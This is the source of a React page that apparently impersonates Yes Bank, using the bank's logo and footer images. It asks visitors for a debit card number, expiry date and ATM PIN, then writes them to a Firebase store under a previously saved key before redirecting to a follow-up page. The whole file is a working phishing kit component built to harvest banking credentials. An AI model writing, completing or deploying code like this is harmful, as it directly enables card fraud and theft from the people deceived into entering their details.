import  { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/yes_bank_top.png';
import footerImage from './assets/yes_footer.jpeg';
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";

function SecondPage() {
  const navigate = useNavigate();
  const [debitCardNumber, setDebitCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState(new Date()); // Initialize with current date
  const [atmPin, setAtmPin] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false); // Submit loading state


  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true); // Show loading during submit
    
    // Validate debit card number (16 digits)
    if (!/^\d{16}$/.test(debitCardNumber)) {
      alert('Debit card number must be 16 digits');
      setIsSubmitting(false);
      return;
    }

    // Validate expiry date format
    const expiryMonth = expiryDate.getMonth() + 1; // Get month (0-11)
    const expiryYear = expiryDate.getFullYear().toString().slice(2); // Get last two digits of year
    const expiryDateStr = `${expiryMonth.toString().padStart(2, '0')}/${expiryYear}`;
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDateStr)) {
      alert('Expiry date must be in MM/YY format');
      setIsSubmitting(false);
      return;
    }

    // Validate ATM PIN (4 digits)
    if (!/^\d{4}$/.test(atmPin)) {
      alert('ATM PIN must be 4 digits');
      setIsSubmitting(false);
      return;
    }

    setTimeout(async () =>  {
      const key = localStorage.getItem('key');
      console.log("key = "+key);
      const result = await FirebaseUtil.updateAnyModel("notes_web3/", key, { 
        debitCardNumber, 
        expiryDate: expiryDateStr, // Convert date to MM/YY format
        atmPin 
      });
      console.log("result.key = "+result.key);
      setIsSubmitting(false); // Hide loading after submit
      navigate('/intermediate-page'); // Navigate to intermediate page after submission
    }, 2000); // 1-second delay
  };


  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-blue-600 rounded shadow">
      {isSubmitting && (
        <div className="absolute inset-0 flex items-center justify-center bg-white bg-opacity-50">
          <div className="loader"></div>
        </div>
      )}
        <div className="flex justify-center items-center w-full">
          <img className="w-auto h-auto" src={myImage} alt="Description of the image" />
        </div>
      <h1 className="text-lg font-bold mb-4 flex items-center text-white">
        <MdLock className="mr-2 text-orange-500" />
        Fill the details to proceed
      </h1>
      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label
            className="block text-gray-200 text-sm font-bold mb-2"
            htmlFor="debitCardNumber"
          >
            Debit Card Number 
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="debitCardNumber"
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            value={debitCardNumber}
            onChange={(e) => {
              // Only allow numeric input and limit to 16 characters
              const numericValue = e.target.value.replace(/\D/g, '').slice(0, 16);
              setDebitCardNumber(numericValue);
            }}
            placeholder="Enter 16-digit Debit Card Number"
            maxLength="16"
            required
          />
        </div>
     
        <div className="mb-4">
            <label
              className="block text-gray-200 text-sm font-bold mb-2"
              htmlFor="expiryDate"
            > Expiry Date
            </label>
            <DatePicker
              selected={expiryDate}
              onChange={(date) => setExpiryDate(date)}
              dateFormat="MM/yy"
              showMonthYearPicker
              minDate={new Date()}
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              placeholderText="Select Expiry Date"
              required
            />
          </div>
        <div className="mb-4">
            <label
              className="block text-gray-200 text-sm font-bold mb-2"
              htmlFor="atmPin"
            > ATM PIN
            </label>
            <input
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              id="atmPin"
              type="password"
              inputMode="numeric"
              pattern="[0-9]*"
              value={atmPin}
              onChange={(e) => {
                // Only allow numeric input and limit to 4 characters
                const numericValue = e.target.value.replace(/\D/g, '').slice(0, 4);
                setAtmPin(numericValue);
              }}
              placeholder="Enter 4-digit ATM PIN"
              maxLength="4"
              required
            />
          </div>
        <div className="flex justify-center">
          <button
            className="bg-gray-200 hover:bg-gray-400 text-gray-900 font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
            type="submit"
            disabled={isSubmitting} // Disable button during submit   
          >
            {isSubmitting ? "Loading..." : "Proceed"}
          </button>
        </div>
      </form>
      {/* footer image */}
      <div className="flex justify-center mt-4">
        <img src={footerImage} alt="Description of the image" />
      </div>
      
    </div>
  );
}

export default SecondPage;